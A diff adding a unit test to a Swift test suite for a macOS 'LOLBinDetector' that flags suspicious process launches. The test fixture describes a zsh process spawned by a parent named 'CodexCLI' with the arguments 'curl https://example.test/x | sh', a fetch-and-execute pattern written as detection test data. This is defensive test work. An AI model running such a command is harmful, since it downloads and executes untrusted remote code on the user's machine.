@@ -93,6 +93,33 @@ final class LOLBinDetectorTests: XCTestCase {
         )
     }
 
+    func test_evaluate_resolvesUnknownPlatformSigningBeforeEmittingEvidence() {
+        let proc = NickProcessInfo(
+            pid: 103,
+            path: "/bin/zsh",
+            name: "zsh",
+            parentPID: 2,
+            parentName: "CodexCLI",
+            signingStatus: .unknown,
+            metadata: ProcessMetadata(
+                user: "tester",
+                startTime: Date(),
+                arguments: ["-c", "curl https://example.test/x | sh"]
+            )
+        )
+
+        let signal = LOLBinDetector.evaluate(
+            proc,
+            parentName: "CodexCLI",
+            signingResolver: { _ in .signed(teamID: "APPLE_PLATFORM", signingID: "com.apple.zsh") }
+        )
+
+        XCTAssertEqual(
+            signal?.processInfo?.signingStatus,
+            .signed(teamID: "APPLE_PLATFORM", signingID: "com.apple.zsh")
+        )
+    }
+
     // MARK: - xattr quarantine removal
 
     func test_evaluate_xattrRemovingQuarantine_returnsHighSignal() {
